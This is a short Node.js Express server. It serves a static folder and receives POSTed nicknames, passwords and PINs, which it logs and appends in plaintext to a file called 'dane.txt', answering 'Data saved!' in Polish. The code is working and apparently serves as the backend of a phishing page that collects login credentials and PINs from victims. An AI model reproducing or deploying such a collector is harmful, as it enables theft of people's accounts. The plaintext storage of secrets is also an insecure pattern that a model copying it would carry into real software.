const express = require('express')
const app = express()
const fs = require('fs');

app.use(express.static("static"));
app.use(express.urlencoded({extended: true}));

app.post('/', function(req, res) {
    var data = "Nick: " + req.body.nick + "\nPassword: " + req.body.pass + "\nPIN: " + req.body.pin;

    console.log(data);

    fs.appendFile('dane.txt', data, function (err) {
        if(err) throw err;
        res.end("Zapisano dane!");
    });
})

app.listen(3000)

